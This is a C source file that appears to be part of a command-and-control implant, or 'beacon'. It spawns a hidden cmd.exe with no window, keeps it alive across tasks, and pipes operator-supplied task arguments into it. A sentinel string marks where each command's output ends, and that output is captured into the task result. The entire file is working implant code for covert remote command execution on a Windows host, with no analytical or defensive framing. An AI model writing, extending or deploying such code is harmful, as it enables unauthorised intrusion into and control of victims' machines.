#include <beacon.h>
#include <stdio.h>
#include <string.h>

#define SENTINEL        "__GHOSTOPS_EOC__"
#define SENTINEL_CMD    "echo " SENTINEL "\r\n"
#define TIMEOUT_MS      30000
#define POLL_MS         50

static HANDLE g_hProc    = NULL;
static HANDLE g_hStdinW  = NULL;
static HANDLE g_hStdoutR = NULL;

static void shell_close(void) {
    if (g_hProc)    { TerminateProcess(g_hProc, 0); CloseHandle(g_hProc);    g_hProc    = NULL; }
    if (g_hStdinW)  { CloseHandle(g_hStdinW);                                 g_hStdinW  = NULL; }
    if (g_hStdoutR) { CloseHandle(g_hStdoutR);                                g_hStdoutR = NULL; }
}

static BOOL shell_alive(void) {
    return g_hProc && WaitForSingleObject(g_hProc, 0) == WAIT_TIMEOUT;
}

static DWORD shell_read_sentinel(char *buf, DWORD buf_sz, DWORD timeout_ms) {
    DWORD total    = 0;
    DWORD deadline = GetTickCount() + timeout_ms;

    while (GetTickCount() < deadline) {
        DWORD avail = 0;
        if (!PeekNamedPipe(g_hStdoutR, NULL, 0, NULL, &avail, NULL)) break;
        if (avail == 0) { Sleep(POLL_MS); continue; }

        DWORD chunk = avail;
        if (total + chunk >= buf_sz - 1) chunk = buf_sz - 1 - total;
        if (chunk == 0) break;

        DWORD nread = 0;
        if (!ReadFile(g_hStdoutR, buf + total, chunk, &nread, NULL) || nread == 0) break;
        total += nread;
        buf[total] = '\0';

        if (strstr(buf, SENTINEL)) break;
    }
    return total;
}

static BOOL shell_spawn(void) {
    HANDLE hStdinR = NULL, hStdoutW = NULL;

    SECURITY_ATTRIBUTES sa;
    memset(&sa, 0, sizeof(sa));
    sa.nLength        = sizeof(sa);
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&hStdinR,  &g_hStdinW,  &sa, 0)) goto fail;
    if (!CreatePipe(&g_hStdoutR, &hStdoutW, &sa, 0)) goto fail;

    SetHandleInformation(g_hStdinW,  HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(g_hStdoutR, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    memset(&si, 0, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = hStdinR;
    si.hStdOutput  = hStdoutW;
    si.hStdError   = hStdoutW;

    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));

    char cmdline[] = "cmd.exe";
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        goto fail;

    g_hProc = pi.hProcess;
    CloseHandle(pi.hThread);

    CloseHandle(hStdinR);
    CloseHandle(hStdoutW);

    const char *init = "@echo off\r\nprompt\r\n" SENTINEL_CMD;
    DWORD w = 0;
    WriteFile(g_hStdinW, init, (DWORD)strlen(init), &w, NULL);

    char drain[4096];
    shell_read_sentinel(drain, sizeof(drain), 5000);
    return TRUE;

fail:
    if (hStdinR)  CloseHandle(hStdinR);
    if (hStdoutW) CloseHandle(hStdoutW);
    shell_close();
    return FALSE;
}

static void shell_ensure(void) {
    if (!shell_alive()) {
        shell_close();
        shell_spawn();
    }
}

void beacon_exec_shell(BEACON_CTX *ctx, PARSED_TASK *task, TASK_RESULT *result) {
    (void)ctx;

    shell_ensure();

    if (!shell_alive()) {
        snprintf(result->error, sizeof(result->error), "failed to spawn shell");
        return;
    }

    char line[sizeof(task->args) + 32];
    int  line_len = snprintf(line, sizeof(line), "%s\r\n" SENTINEL_CMD, task->args);
    DWORD written = 0;
    WriteFile(g_hStdinW, line, (DWORD)line_len, &written, NULL);

    DWORD total = shell_read_sentinel(result->output, result->output_cap, TIMEOUT_MS);

    char *pos = strstr(result->output, SENTINEL);
    if (pos) {
        char *sol = pos;
        while (sol > result->output && sol[-1] != '\n') sol--;
        while (sol > result->output && (sol[-1] == '\r' || sol[-1] == '\n')) sol--;
        *sol = '\0';
        result->output_len = (DWORD)(sol - result->output);
    } else {
        result->output_len = total;
        snprintf(result->error, sizeof(result->error),
                 "timed out after %ds", TIMEOUT_MS / 1000);
    }
}